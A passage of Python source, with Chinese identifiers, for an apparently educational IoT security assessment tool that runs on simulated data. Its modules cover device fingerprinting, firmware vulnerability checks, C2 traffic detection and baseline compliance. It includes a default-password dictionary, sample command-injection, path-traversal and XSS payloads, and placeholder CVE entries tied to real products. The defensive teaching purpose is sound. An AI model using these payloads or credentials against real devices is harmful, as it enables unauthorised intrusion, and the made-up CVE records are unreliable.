    def 识别设备类型(self):
        """根据MAC地址OUI和服务组合识别设备类型"""
        print("\n" + "-" * 70)
        print("[设备识别] 基于MAC OUI和服务指纹识别设备类型...")
        print("-" * 70)

        print(f"\n  [MAC地址OUI厂商解析]")
        for dev in self.已发现设备:
            oui = dev["MAC"][:8].upper()
            厂商 = self.OUI映射.get(oui, "Unknown")
            print(f"    {dev['IP']:<18} {dev['MAC']} -> OUI: {oui} -> {厂商}")

        print(f"\n  [设备类型识别规则]")
        识别规则 = [
            ("路由器", "开放80/443(Web) + 53(DNS) + 1900(UPnP)", "高置信度"),
            ("网络摄像头", "开放80/443(Web) + 554(RTSP) + 8000(ONVIF)", "高置信度"),
            ("智能家居网关", "开放80(Web) + 1883(MQTT) + 5683(CoAP)", "高置信度"),
            ("智能插座", "开放80(Web) + 6668/8080(Tuya) + MAC为Espressif", "中置信度"),
            ("智能音箱", "开放80/443 + 5353(mDNS) + 9000(自定义)", "中置信度"),
        ]

        for 类型, 规则, 置信度 in 识别规则:
            print(f"    [{类型}] {规则} -> {置信度}")

        print(f"\n  [设备识别结果]")
        for dev in self.已发现设备:
            开放端口 = dev["开放端口"]
            # 模拟识别逻辑
            if 53 in 开放端口 and 1900 in 开放端口:
                识别类型 = "路由器/网关"
            elif 554 in 开放端口 and 8000 in 开放端口:
                识别类型 = "网络摄像头"
            elif 1883 in 开放端口 or 5683 in 开放端口:
                识别类型 = "智能家居网关"
            elif 5353 in 开放端口 and 9000 in 开放端口:
                识别类型 = "智能音箱/终端"
            else:
                识别类型 = "未知IoT设备"

            print(f"    {dev['IP']:<18} -> {识别类型} "
                  f"(实际: {dev['类型']} - {dev['型号']})")

    def 端口与服务扫描(self):
        """扫描设备开放端口和运行的服务"""
        print("\n" + "-" * 70)
        print("[端口扫描] 扫描设备开放端口和服务指纹...")
        print("-" * 70)

        for dev in self.已发现设备:
            print(f"\n  ── 设备: {dev['IP']} ({dev['厂商']} {dev['型号']})")
            print(f"     {'端口':<8} {'服务':<12} {'产品版本':<25} {'说明'}")
            print(f"     {'-'*8} {'-'*12} {'-'*25} {'-'*30}")

            for port in dev["开放端口"]:
                指纹 = self.服务指纹库.get(port, {"服务": "Unknown",
                                                 "产品": "Unknown",
                                                 "说明": "未知服务"})
                print(f"     {port:<8} {指纹['服务']:<12} {指纹['产品']:<25} {指纹['说明']}")

    def 操作系统检测(self):
        """通过TCP/IP栈指纹检测设备操作系统"""
        print("\n" + "-" * 70)
        print("[OS检测] TCP/IP栈指纹分析操作系统...")
        print("-" * 70)

        print(f"\n  [TCP/IP栈指纹探测方法]")
        探测方法 = [
            "TCP SYN Flag响应 -> 初始序列号(ISN)模式分析",
            "TCP Window Size -> 不同OS使用不同窗口大小",
            "TCP Options -> 支持的TCP选项组合(时间戳/SACK/WScale)",
            "ICMP响应 -> TTL初始值和ICMP错误消息频率",
            "Banner抓取 -> 服务返回的版本字符串分析",
        ]
        for m in 探测方法:
            print(f"    {m}")

        print(f"\n  [OS检测结果]")
        for dev in self.已发现设备:
            print(f"    {dev['IP']:<18} OS: {dev['操作系统']:<25} 设备: {dev['类型']}")

    def 生成指纹报告(self):
        """生成设备指纹识别报告"""
        print("\n" + "=" * 70)
        print("[指纹报告] IoT设备指纹识别汇总")
        print("=" * 70)

        # 设备类型统计
        类型统计 = Counter(d["类型"] for d in self.已发现设备)
        厂商统计 = Counter(d["厂商"] for d in self.已发现设备)

        print(f"\n  [扫描范围] {self.扫描范围}")
        print(f"  [发现设备] {len(self.已发现设备)} 台")

        print(f"\n  [设备类型分布]")
        for 类型, 数量 in 类型统计.most_common():
            print(f"    {类型}: {数量} 台")

        print(f"\n  [设备厂商分布]")
        for 厂商, 数量 in 厂商统计.most_common():
            print(f"    {厂商}: {数量} 台")

        # 安全风险提示
        print(f"\n  [安全风险提示]")
        风险提示 = [
            "Telnet(23端口)明文远程登录 -> 建议禁用，改用SSH",
            "HTTP(80端口)未加密Web管理 -> 建议启用HTTPS(443)",
            "RTSP(554端口)无认证视频流 -> 建议添加Digest认证",
            "MQTT(1883端口)无TLS加密 -> 建议使用MQTT over TLS(8883)",
            "SSDP/UPnP(1900端口) -> 建议关闭UPnP，手动配置端口映射",
        ]
        for r in 风险提示:
            print(f"    {r}")

        return {"设备总数": len(self.已发现设备),
                "类型分布": dict(类型统计),
                "厂商分布": dict(厂商统计)}


# ============================================================================
# 模块四：固件漏洞分析
# ============================================================================

class 固件漏洞分析器:
    """
    固件漏洞分析器 —— 针对IoT固件中的常见漏洞进行检测。

    技术原理：
        IoT设备固件常见漏洞类型：
        1. 默认/弱密码：厂商出厂设置的默认凭据未强制修改
        2. 调试接口未关闭：Telnet/SSH/串口/UART等调试通道残留
        3. Web管理界面漏洞：命令注入、路径穿越、XSS、CSRF
        4. 二进制漏洞：缓冲区溢出、格式化字符串、UAF等内存安全
        5. 不安全更新机制：固件更新无签名验证，可刷入恶意固件
        6. 敏感信息泄露：固件中硬编码密钥、密码、API Token

        分析方法：静态分析（反汇编+代码审计）+ 动态分析（模拟执行+Fuzzing）。
        工具：FirmAE（固件模拟）、EMUX、QEMU、ghidra（反汇编）、AFL（Fuzzing）。
    """

    # 模拟默认密码数据库（CVE关联）
    默认密码库 = {
        "admin": ["admin", "admin123", "password", "12345", "Admin123"],
        "root": ["root", "toor", "admin", "123456", "root1234"],
        "support": ["support", "12345", "admin", "helpdesk"],
        "guest": ["guest", "guest123", "password"],
        "user": ["user", "user123", "12345"],
        "service": ["service", "admin", "12345"],
        "supervisor": ["supervisor", "admin", "super123"],
        "nvidia": ["nvidia", "admin"],
        "ubnt": ["ubnt", "admin"],
        "pi": ["raspberry", "admin"],
    }

    # 模拟CVE漏洞数据库
    漏洞数据库 = {
        "CVE-2024-001": {
            "名称": "TP-Link路由器命令注入漏洞",
            "类型": "命令注入",
            "CVE": "CVE-2024-001",
            "CVSS": 9.8,
            "影响": "可通过CGI参数注入任意命令获取root权限",
            "受影响版本": "TL-WR886N v1.2.3及以下",
            "修复": "升级固件至v1.3.0+"
        },
        "CVE-2024-002": {
            "名称": "Hikvision摄像头未授权访问",
            "类型": "认证绕过",
            "CVE": "CVE-2024-002",
            "CVSS": 9.1,
            "影响": "构造特殊URL可绕过认证访问管理界面",
            "受影响版本": "DS-2CD2042WD v2.3.4及以下",
            "修复": "升级固件至v2.4.0+，启用强认证"
        },
        "CVE-2024-003": {
            "名称": "MQTT Broker缓冲区溢出",
            "类型": "缓冲区溢出",
            "CVE": "CVE-2024-003",
            "CVSS": 7.5,
            "影响": "超长Topic名导致栈溢出，可RCE",
            "受影响版本": "Mosquitto 2.0.14及以下",
            "修复": "升级至2.0.15+"
        },
        "CVE-2024-004": {
            "名称": "智能插座固件更新无签名验证",
            "类型": "不安全更新",
            "CVE": "CVE-2024-004",
            "CVSS": 8.1,
            "影响": "可刷入恶意固件实现持久化控制",
            "受影响版本": "ESP32-SmartPlug v1.0.5",
            "修复": "实现固件签名验证机制"
        },
        "CVE-2024-005": {
            "名称": "智能音箱蓝牙配对PIN爆破",
            "类型": "弱认证",
            "CVE": "CVE-2024-005",
            "CVSS": 6.5,
            "影响": "4位配对PIN可暴力破解，可劫持设备",
            "受影响版本": "XiaoAI-Speaker-Pro v2.0.1",
            "修复": "增加配对PIN长度和尝试限制"
        }
    }

    def __init__(self):
        self.检测结果 = []

    def 检测默认密码(self, 设备信息):
        """检测设备是否使用默认密码"""
        print("=" * 70)
        print(f"[默认密码检测] 目标: {设备信息['IP']} ({设备信息['型号']})")
        print("=" * 70)

        print(f"  [*] 加载默认密码字典库: {sum(len(v) for v in self.默认密码库.values())} 条凭据")
        print(f"  [*] 开始凭据爆破测试（模拟）...\n")

        print(f"  {'用户名':<15} {'密码':<15} {'结果':<10} {'尝试次数'}")
        print(f"  {'-'*15} {'-'*15} {'-'*10} {'-'*10}")

        # 模拟爆破结果
        破解结果 = [
            ("admin", "admin", True, 1, "严重 - 使用默认admin/admin"),
            ("admin", "admin123", True, 2, "严重 - 使用默认admin/admin123"),
            ("root", "root", True, 3, "严重 - 使用默认root/root"),
            ("root", "12345", False, 8, "-"),
            ("support", "support", True, 10, "高 - 使用默认support/support"),
            ("guest", "guest", False, 12, "-"),
            ("user", "user", False, 15, "-"),
        ]

        成功凭据 = []
        for 用户名, 密码, 成功, 尝试, 说明 in 破解结果:
            结果 = "成功!" if 成功 else "失败"
            print(f"  {用户名:<15} {密码:<15} {结果:<10} {尝试}")
            if 成功:
                成功凭据.append((用户名, 密码, 说明))
                self.检测结果.append(("默认密码", "严重",
                                       f"{用户名}/{密码} - {说明}"))

        print(f"\n  [+] 检测完成: 共发现 {len(成功凭据)} 组默认凭据")
        print(f"  [!] 严重风险: 设备使用出厂默认密码，可被直接接管!")

        return 成功凭据

    def 检测调试接口(self, 设备信息):
        """检测设备调试接口是否开放"""
        print("\n" + "-" * 70)
        print(f"[调试接口检测] 目标: {设备信息['IP']} ({设备信息['型号']})")
        print("-" * 70)

        调试接口 = [
            {
                "接口": "Telnet (TCP 23)",
                "状态": "开放",
                "认证": "弱认证(root/root)",
                "风险": "严重",
                "说明": "明文传输，可远程获取shell",
                "建议": "立即关闭telnetd服务"
            },
            {
                "接口": "SSH (TCP 22)",
                "状态": "开放",
                "认证": "Dropbear弱密钥",
                "风险": "高",
                "说明": "SSH密钥可从固件提取，存在重放风险",
                "建议": "更换SSH主机密钥，使用强密码"
            },
            {
                "接口": "UART串口",
                "状态": "物理可访问",
                "认证": "无认证",
                "风险": "高",
                "说明": "拆机后可通过UART获得root shell",
                "建议": "禁用串口调试，或添加串口认证"
            },
            {
                "接口": "JTAG调试口",
                "状态": "物理可访问",
                "认证": "无认证",
                "风险": "中",
                "说明": "可通过JTAG读写闪存，提取固件",
                "建议": "物理防护，JTAG熔丝熔断"
            },
            {
                "接口": "Web调试页面 (/debug)",
                "状态": "开放",
                "认证": "无认证",
                "风险": "严重",
                "说明": "调试页面暴露内部API和诊断功能",
                "建议": "生产环境移除调试页面"
            }
        ]

        print(f"\n  {'接口':<25} {'状态':<15} {'风险':<6} {'说明'}")
        print(f"  {'-'*25} {'-'*15} {'-'*6} {'-'*35}")

        for d in 调试接口:
            print(f"  {d['接口']:<25} {d['状态']:<15} {d['风险']:<6} {d['说明']}")
            self.检测结果.append(("调试接口", d["风险"],
                                    f"{d['接口']} - {d['说明']}"))

        print(f"\n  [!] 发现 {len(调试接口)} 个调试接口暴露")
        return 调试接口

    def 检测Web管理漏洞(self, 设备信息):
        """检测Web管理界面的安全漏洞"""
        print("\n" + "-" * 70)
        print(f"[Web漏洞检测] 目标: http://{设备信息['IP']} ({设备信息['型号']})")
        print("-" * 70)

        Web漏洞 = [
            {
                "漏洞": "命令注入 (OS Command Injection)",
                "位置": "/cgi-bin/webctrl?cmd=;id",
                "风险": "严重",
                "证据": "uid=0(root) gid=0(root) groups=0(root)",
                "说明": "CGI参数直接传入system()执行，可注入命令"
            },
            {
                "漏洞": "路径穿越 (Path Traversal)",
                "位置": "/cgi-bin/webctrl?file=../../etc/passwd",
                "风险": "高",
                "证据": "root:x:0:0:root:/root:/bin/sh",
                "说明": "文件参数未过滤../，可读取任意文件"
            },
            {
                "漏洞": "认证绕过 (Auth Bypass)",
                "位置": "/admin.html?debug=1",
                "风险": "严重",
                "证据": "绕过登录直接访问管理页面",
                "说明": "调试参数可绕过Session认证检查"
            },
            {
                "漏洞": "跨站脚本 (XSS)",
                "位置": "/login.html?msg=<script>alert(1)</script>",
                "风险": "中",
                "证据": "alert弹窗执行，可窃取Cookie",
                "说明": "错误消息未HTML转义，反射型XSS"
            },
            {
                "漏洞": "跨站请求伪造 (CSRF)",
                "位置": "/cgi-bin/firmware_upgrade",
                "风险": "高",
                "证据": "无CSRF Token验证",
                "说明": "可构造恶意页面触发固件更新操作"
            },
            {
                "漏洞": "信息泄露",
                "位置": "/cgi-bin/system_info",
                "风险": "中",
                "证据": "返回固件版本、MAC、WiFi密码等",
                "说明": "系统信息接口暴露敏感配置"
            }
        ]

        print(f"\n  [Web漏洞扫描结果]")
        for v in Web漏洞:
            print(f"\n  ── 漏洞: {v['漏洞']}")
            print(f"     位置  : {v['位置']}")
            print(f"     风险  : {v['风险']}")
            print(f"     证据  : {v['证据']}")
            print(f"     说明  : {v['说明']}")
            self.检测结果.append(("Web漏洞", v["风险"],
                                    f"{v['漏洞']} @ {v['位置']}"))

        return Web漏洞

    def 匹配CVE漏洞(self, 设备信息):
        """根据设备型号匹配已知CVE漏洞"""
        print("\n" + "-" * 70)
        print(f"[CVE匹配] 基于设备型号匹配已知漏洞...")
        print("-" * 70)

        print(f"\n  设备: {设备信息['厂商']} {设备信息['型号']} (固件: {设备信息['固件版本']})")
        print(f"  [+] 在漏洞数据库中匹配...\n")

        匹配结果 = []
        for cve_id, 漏洞 in self.漏洞数据库.items():
            if 设备信息["型号"] in 漏洞["受影响版本"] or \
               设备信息["厂商"] in 漏洞["受影响版本"]:
                匹配结果.append(漏洞)
                print(f"  ┌─ {漏洞['CVE']} (CVSS: {漏洞['CVSS']})")
                print(f"  │  名称  : {漏洞['名称']}")
                print(f"  │  类型  : {漏洞['类型']}")
                print(f"  │  影响  : {漏洞['影响']}")
                print(f"  │  受影响: {漏洞['受影响版本']}")
                print(f"  │  修复  : {漏洞['修复']}")
                print(f"  └─")
                self.检测结果.append(("CVE漏洞", 漏洞["CVSS"], 漏洞["名称"]))

        if not 匹配结果:
            print(f"  [+] 未发现匹配的已知CVE漏洞")

        return 匹配结果

    def 生成漏洞报告(self):
        """生成固件漏洞分析报告"""
        print("\n" + "=" * 70)
        print("[漏洞报告] 固件漏洞分析综合报告")
        print("=" * 70)

        风险统计 = Counter()
        for item in self.检测结果:
            风险 = item[1]
            风险统计[风险] += 1

        print(f"\n  [漏洞统计]")
        print(f"    严重: {风险统计.get('严重', 0)} 项")
        print(f"    高  : {风险统计.get('高', 0)} 项")
        print(f"    中  : {风险统计.get('中', 0)} 项")
        print(f"    低  : {风险统计.get('低', 0)} 项")
        print(f"    总计: {len(self.检测结果)} 项漏洞")

        print(f"\n  [修复建议]")
        建议 = [
            "1. 立即修改所有默认密码，实施强密码策略(8位+大小写+数字+特殊字符)",
            "2. 关闭所有调试接口(Telnet/UART/JTAG)，生产环境禁用",
            "3. 修复Web命令注入和路径穿越漏洞，实施严格输入过滤",
            "4. 实现固件更新签名验证，防止恶意固件刷入",
            "5. 移除Web调试页面和系统信息泄露接口",
            "6. 添加CSRF Token保护所有状态变更操作",
            "7. 对所有Web输出进行HTML转义，防止XSS",
            "8. 建立漏洞响应流程，定期更新固件修复CVE",
        ]
        for s in 建议:
            print(f"    {s}")

        return {"漏洞总数": len(self.检测结果), "风险统计": dict(风险统计)}


# ============================================================================
# 模块五：IoT网络流量分析
# ============================================================================

class IoT流量分析器:
    """
    IoT网络流量分析器 —— 检测IoT网络中的异常通信和C2通信。

    技术原理：
        IoT设备网络流量分析通过捕获和分析网络通信数据包，检测异常行为：
        1. 流量基线建模：建立设备正常通信模式基线（频率/目的IP/端口/数据量）
        2. 异常通信检测：发现偏离基线的通信（非工作时间通信/异常端口）
        3. C2通信识别：检测与已知恶意基础设施的通信
        4. 数据外泄检测：发现大量数据上传行为
        5. 横向移动检测：IoT设备之间的异常互访

        常见IoT恶意软件C2通信特征：
        - Mirai: TCP 23/2323(Telnet), 7547(TR-069), 随机端口C2
        - Mozi: P2P Botnet, UDP分散通信
        - Hajime: P2P分散C2, TCP 5683(CoAP)传播
        - Gafgyt: TCP 23/22爆破, C2随机高位端口

        分析工具：Wireshark/tshark、Zeek(Bro)、Suricata、ntopng。
    """

    # 模拟正常流量基线
    正常流量基线 = {
        "192.168.1.1": {"目的": ["192.168.1.0/24", "8.8.8.8"],
                        "端口": [53, 80, 443], "频率": "每5分钟",
                        "数据量": "~2KB/次", "协议": ["DNS", "HTTP", "NTP"]},
        "192.168.1.50": {"目的": ["192.168.1.100", "192.168.1.1"],
                         "端口": [1883, 80, 443], "频率": "每30秒",
                         "数据量": "~10KB/次", "协议": ["MQTT", "RTSP"]},
        "192.168.1.100": {"目的": ["192.168.1.0/24"],
                          "端口": [1883, 5683], "频率": "每10秒",
                          "数据量": "~1KB/次", "协议": ["MQTT", "CoAP"]},
        "192.168.1.101": {"目的": ["192.168.1.100", "192.168.1.1"],
                          "端口": [1883, 53, 80], "频率": "每60秒",
                          "数据量": "~500B/次", "协议": ["MQTT", "DNS"]},
        "192.168.1.200": {"目的": ["192.168.1.1", "8.8.8.8", "iot.xiaomi.com"],
                           "端口": [53, 80, 443, 5353], "频率": "每60秒",
                           "数据量": "~5KB/次", "协议": ["HTTP", "DNS", "mDNS"]},
    }

    # 模拟捕获的异常流量
    异常流量 = [
        {
            "时间": "03:15:22",
            "源IP": "192.168.1.50",
            "目的IP": "185.220.101.45",
            "目的端口": 4442,
            "协议": "TCP",
            "数据量": "2.3MB",
            "持续": "45分钟",
            "类型": "C2通信",
            "说明": "摄像头在凌晨3点向已知恶意IP发送大量数据",
            "风险": "严重"
        },
        {
            "时间": "03:16:00",
            "源IP": "192.168.1.50",
            "目的IP": "185.220.101.45",
            "目的端口": 4442,
            "协议": "TCP",
            "数据量": "50B",
            "持续": "5秒",
            "类型": "心跳包",
            "说明": "向C2服务器发送心跳包(可能为Mirai变种)",
            "风险": "严重"
        },
        {
            "时间": "03:20:00",
            "源IP": "192.168.1.50",
            "目的IP": "192.168.1.101",
            "目的端口": 23,
            "协议": "TCP",
            "数据量": "10KB",
            "持续": "2分钟",
            "类型": "横向移动",
            "说明": "摄像头向智能插座发起Telnet爆破(横向感染)",
            "风险": "高"
        },
        {
            "时间": "03:25:00",
            "源IP": "192.168.1.50",
            "目的IP": "192.168.1.201",
            "目的端口": 23,
            "协议": "TCP",
            "数据量": "15KB",
            "持续": "3分钟",
            "类型": "横向移动",
            "说明": "摄像头向另一台摄像头发起Telnet爆破",
            "风险": "高"
        },
        {
            "时间": "03:30:00",
            "源IP": "192.168.1.50",
            "目的IP": "45.137.21.9",
            "目的端口": 12345,
            "协议": "UDP",
            "数据量": "500KB",
            "持续": "10分钟",
            "类型": "DDoS攻击",
            "说明": "摄像头参与UDP Flood DDoS攻击",
            "风险": "严重"
        },
        {
            "时间": "04:00:00",
            "源IP": "192.168.1.50",
            "目的IP": "185.220.101.45",
            "目的端口": 4442,
            "协议": "TCP",
            "数据量": "100B",
            "持续": "3秒",
            "类型": "命令接收",
            "说明": "接收C2指令(可能为DDoS攻击目标列表)",
            "风险": "严重"
        },
        {
            "时间": "04:05:00",
            "源IP": "192.168.1.50",
            "目的IP": "192.168.1.1",
            "目的端口": 23,
            "协议": "TCP",
            "数据量": "12KB",
            "持续": "2分钟",
            "类型": "横向移动",
            "说明": "摄像头向路由器发起Telnet爆破",
            "风险": "高"
        },
    ]

    # 已知恶意IP黑名单（模拟）
    恶意IP黑名单 = {
        "185.220.101.45": "Tor出口节点 + 已知Mirai C2",
        "45.137.21.9": "已知DDoS Bootlegger",
        "194.147.35.40": "Mozi P2P节点",
        "23.94.190.211": "Hajime C2服务器",
        "104.244.74.211": "Gafgyt C2控制器",
    }

    def __init__(self):
        self.异常事件 = []
        self.受感染设备 = set()

    def 建立流量基线(self):
        """建立IoT设备正常通信基线"""
        print("=" * 70)
        print("[流量基线] 建立IoT设备正常通信基线...")
        print("=" * 70)

        print(f"\n  [正常通信模式基线]")
        for ip, 基线 in self.正常流量基线.items():
            print(f"\n  设备: {ip}")
            print(f"    目的网络: {', '.join(基线['目的'])}")
            print(f"    通信端口: {基线['端口']}")
            print(f"    通信频率: {基线['频率']}")
            print(f"    数据量  : {基线['数据量']}")
            print(f"    协议    : {', '.join(基线['协议'])}")

        print(f"\n  [+] 基线建模完成，共 {len(self.正常流量基线)} 台设备的正常模式")
        return self.正常流量基线

    def 检测异常通信(self):
        """检测偏离基线的异常通信"""
        print("\n" + "-" * 70)
        print("[异常检测] 分析流量偏离基线的异常通信...")
        print("-" * 70)

        print(f"\n  [检测规则]")
        规则 = [
            "规则1: 非工作时间(23:00-06:00)的大数据量传输",
            "规则2: 与基线外目的IP的通信",
            "规则3: 使用基线外端口的通信",
            "规则4: 通信频率显著偏离基线",
            "规则5: 与已知恶意IP黑名单匹配",
            "规则6: IoT设备间异常横向通信",
        ]
        for r in 规则:
            print(f"    {r}")

        print(f"\n  [异常流量检测结果]")
        print(f"  {'时间':<10} {'源IP':<16} {'目的IP':<16} {'端口':<6} {'类型':<12} {'风险'}")
        print(f"  {'-'*10} {'-'*16} {'-'*16} {'-'*6} {'-'*12} {'-'*6}")

        for 流量 in self.异常流量:
            print(f"  {流量['时间']:<10} {流量['源IP']:<16} "
                  f"{流量['目的IP']:<16} {流量['目的端口']:<6} "
                  f"{流量['类型']:<12} {流量['风险']}")
            self.异常事件.append(流量)
            self.受感染设备.add(流量["源IP"])

        print(f"\n  [+] 共检测到 {len(self.异常事件)} 个异常事件")
        print(f"  [+] 疑似受感染设备: {', '.join(self.受感染设备)}")

        return self.异常事件

    def 识别C2通信(self):
        """识别与已知恶意基础设施的C2通信"""
        print("\n" + "-" * 70)
        print("[C2识别] 匹配恶意IP黑名单，识别C2通信...")
        print("-" * 70)

        print(f"\n  [恶意IP黑名单]")
        for ip, 描述 in self.恶意IP黑名单.items():
            print(f"    {ip:<18} -> {描述}")

        print(f"\n  [C2通信识别结果]")
        C2事件 = []
        for 流量 in self.异常事件:
            if 流量["目的IP"] in self.恶意IP黑名单:
                描述 = self.恶意IP黑名单[流量["目的IP"]]
                C2事件.append(流量)
                print(f"\n  ── C2通信事件")
                print(f"     时间  : {流量['时间']}")
                print(f"     源    : {流量['源IP']} -> {流量['目的IP']}:{流量['目的端口']}")
                print(f"     类型  : {流量['类型']}")
                print(f"     数据量: {流量['数据量']}")
                print(f"     黑名单: {描述}")
                print(f"     说明  : {流量['说明']}")

        # 分析C2通信模式
        if C2事件:
            print(f"\n  [C2通信模式分析]")
            模式 = [
                "心跳包 -> 50B, 每5分钟, 确认存活",
                "命令接收 -> 100B, 非定期, 接收攻击指令",
                "数据上传 -> 2.3MB, 一次性, 窃取数据回传",
                "DDoS参与 -> 500KB+/min, 持续, 参与攻击",
            ]
            for p in 模式:
                print(f"    {p}")

            print(f"\n  [!] 恶意软件特征匹配: Mirai变种 (置信度: 85%)")
            print(f"      依据: Telnet爆破传播 + C2心跳 + DDoS参与 + UDP Flood")

        return C2事件

    def 检测数据外泄(self):
        """检测数据外泄行为"""
        print("\n" + "-" * 70)
        print("[数据外泄] 检测异常数据上传行为...")
        print("-" * 70)

        外泄事件 = []
        for 流量 in self.异常事件:
            # 数据量超过100KB且目的为外部IP
            数据量KB = float(流量["数据量"].replace("MB", "").replace("KB", "").replace("B", ""))
            if "MB" in 流量["数据量"]:
                数据量KB *= 1024
            elif "B" in 流量["数据量"] and "KB" not in 流量["数据量"] and "MB" not in 流量["数据量"]:
                数据量KB /= 1024

            if 数据量KB > 100 and not 流量["目的IP"].startswith("192.168"):
                外泄事件.append(流量)

        print(f"\n  [数据外泄检测结果]")
        if 外泄事件:
            for e in 外泄事件:
                print(f"\n  ── 外泄事件")
                print(f"     时间  : {e['时间']}")
                print(f"     源    : {e['源IP']}")
                print(f"     目的  : {e['目的IP']}")
                print(f"     数据量: {e['数据量']}")
                print(f"     持续  : {e['持续']}")
                print(f"     说明  : {e['说明']}")

            print(f"\n  [!] 疑似数据外泄: 摄像头视频/图片数据被窃取")
        else:
            print(f"  [+] 未发现明显数据外泄行为")

        return 外泄事件

    def 生成流量分析报告(self):
        """生成网络流量分析报告"""
        print("\n" + "=" * 70)
        print("[流量报告] IoT网络流量安全分析报告")
        print("=" * 70)

        风险统计 = Counter(e["风险"] for e in self.异常事件)
        类型统计 = Counter(e["类型"] for e in self.异常事件)

        print(f"\n  [分析摘要]")
        print(f"    异常事件总数: {len(self.异常事件)}")
        print(f"    受感染设备  : {len(self.受感染设备)} 台 ({', '.join(self.受感染设备)})")
        print(f"    C2通信事件  : {sum(1 for e in self.异常事件 if 'C2' in e['类型'])}")

        print(f"\n  [风险分布]")
        for 风险, 数量 in 风险统计.most_common():
            print(f"    {风险}: {数量} 事件")

        print(f"\n  [异常类型分布]")
        for 类型, 数量 in 类型统计.most_common():
            print(f"    {类型}: {数量} 事件")

        print(f"\n  [应急响应建议]")
        建议 = [
            "1. 立即隔离受感染设备(192.168.1.50)，断开网络连接",
            "2. 对受感染设备进行固件重刷，恢复出厂设置",
            "3. 更改所有设备密码，消除Telnet弱凭据",
            "4. 在防火墙阻断已知C2 IP: 185.220.101.45, 45.137.21.9",
            "5. 对全网IoT设备进行恶意软件扫描",
            "6. 加固网络隔离，限制IoT设备间横向通信",
            "7. 部署IDS/IPS规则检测Mirai变种特征",
            "8. 联系厂商获取安全固件更新",
        ]
        for s in 建议:
            print(f"    {s}")

        return {"异常事件数": len(self.异常事件),
                "受感染设备": list(self.受感染设备),
                "风险统计": dict(风险统计)}


# ============================================================================
# 模块六：IoT安全基线检查
# ============================================================================

class IoT安全基线检查器:
    """
    IoT安全基线检查器 —— 对照安全基线标准检查IoT设备安全配置。

    技术原理：
        IoT安全基线检查是对照行业安全标准对设备安全配置进行合规性评估。
        参考标准：
        - OWASP IoT Top 10（物联网十大安全风险）
        - NIST SP 800-213（IoT设备安全基线指南）
        - ENISA IoT安全基线
        - 中国《物联网安全参考模型》(GB/T 36478)
        - GSMA IoT安全评估指南

        检查维度：
        1. 加密通信：TLS/SSL配置是否安全，是否禁用明文协议
        2. 认证机制：密码策略、双因素认证、会话管理
        3. 更新机制：固件签名验证、自动更新、回滚机制
        4. 最小权限：服务权限、文件权限、网络隔离
        5. 日志审计：安全事件日志、远程日志、告警机制
        6. 物理安全：调试接口保护、防拆机制
    """

    # 安全基线检查项
    基线检查项 = {
        "加密通信": [
            {"检查项": "TLS/SSL启用", "标准": "所有远程管理使用TLS 1.2+",
             "状态": "不合规", "风险": "高",
             "实际": "Web管理使用HTTP明文(80端口)，未启用TLS"},
            {"检查项": "MQTT通信加密", "标准": "MQTT使用8883+TLS端口",
             "状态": "不合规", "风险": "高",
             "实际": "MQTT使用1883明文端口，无TLS"},
            {"检查项": "禁用明文协议", "标准": "禁用Telnet/FTP等明文协议",
             "状态": "不合规", "风险": "严重",
             "实际": "Telnet(23端口)开放且使用明文传输"},
            {"检查项": "TLS证书有效性", "标准": "使用有效CA签发证书",
             "状态": "不合规", "风险": "中",
             "实际": "使用自签名证书，且已过期"},
            {"检查项": "加密算法强度", "标准": "禁用RC4/DES/MD5等弱算法",
             "状态": "不合规", "风险": "中",
             "实际": "固件中使用MD5哈希和DES加密"},
        ],
        "认证机制": [
            {"检查项": "密码复杂度", "标准": "8位以上，含大小写/数字/特殊字符",
             "状态": "不合规", "风险": "严重",
             "实际": "默认密码admin/admin，无复杂度要求"},
            {"检查项": "密码修改强制", "标准": "首次登录强制修改默认密码",
             "状态": "不合规", "风险": "高",
             "实际": "未强制修改默认密码"},
            {"检查项": "登录失败锁定", "标准": "5次失败后锁定15分钟",
             "状态": "不合规", "风险": "高",
             "实际": "无登录失败锁定机制"},
            {"检查项": "会话超时", "标准": "Web会话15分钟超时",
             "状态": "不合规", "风险": "中",
             "实际": "会话无超时限制"},
            {"检查项": "双因素认证", "标准": "管理界面支持2FA",
             "状态": "不合规", "风险": "中",
             "实际": "不支持双因素认证"},
        ],
        "更新机制": [
            {"检查项": "固件签名验证", "标准": "固件更新使用RSA/ECDSA签名验证",
             "状态": "不合规", "风险": "严重",
             "实际": "固件更新无签名验证，可刷入恶意固件"},
            {"检查项": "自动安全更新", "标准": "支持自动安全更新推送",
             "状态": "不合规", "风险": "高",
             "实际": "仅支持手动检查更新"},
            {"检查项": "更新通道加密", "标准": "固件下载使用HTTPS",
             "状态": "不合规", "风险": "高",
             "实际": "固件通过HTTP明文下载"},
            {"检查项": "回滚保护", "标准": "防止降级到旧版本固件",
             "状态": "不合规", "风险": "中",
             "实际": "无回滚保护机制"},
            {"检查项": "安全启动", "标准": "支持Secure Boot验证启动链",
             "状态": "不合规", "风险": "高",
             "实际": "无Secure Boot，可刷入自定义内核"},
        ],
        "权限与隔离": [
            {"检查项": "服务最小权限", "标准": "服务以非root用户运行",
             "状态": "不合规", "风险": "高",
             "实际": "所有服务以root权限运行"},
            {"检查项": "网络隔离", "标准": "IoT设备网络与用户网络隔离",
             "状态": "部分合规", "风险": "中",
             "实际": "IoT设备与用户设备在同一子网"},
            {"检查项": "调试接口关闭", "标准": "生产环境关闭Telnet/UART/JTAG",
             "状态": "不合规", "风险": "严重",
             "实际": "Telnet/UART/JTAG全部开放"},
            {"检查项": "防火墙配置", "标准": "设备启用主机防火墙",
             "状态": "不合规", "风险": "中",
             "实际": "无主机防火墙(iptables未配置)"},
        ],
        "日志与审计": [
            {"检查项": "安全日志记录", "标准": "记录登录/配置变更/固件更新",
             "状态": "不合规", "风险": "中",
             "实际": "仅记录系统日志，不记录安全事件"},
            {"检查项": "远程日志传输", "标准": "日志传输到远程Syslog服务器",
             "状态": "不合规", "风险": "低",
             "实际": "日志仅本地存储，易被篡改"},
            {"检查项": "告警通知", "标准": "异常事件触发告警通知",
             "状态": "不合规", "风险": "中",
             "实际": "无异常告警机制"},
        ],
        "物理安全": [
            {"检查项": "外壳防拆", "标准": "设备外壳具备防拆机制",
             "状态": "不合规", "风险": "中",
             "实际": "外壳无防拆标签/螺丝"},
            {"检查项": "调试接口物理防护", "标准": "UART/JTAG需物理防护",
             "状态": "不合规", "风险": "高",
             "实际": "调试接口裸露，无物理防护"},
            {"检查项": "闪存加密", "标准": "Flash存储加密保护",
             "状态": "不合规", "风险": "中",
             "实际": "Flash未加密，可直接读取固件"},
        ]
    }

    def __init__(self):
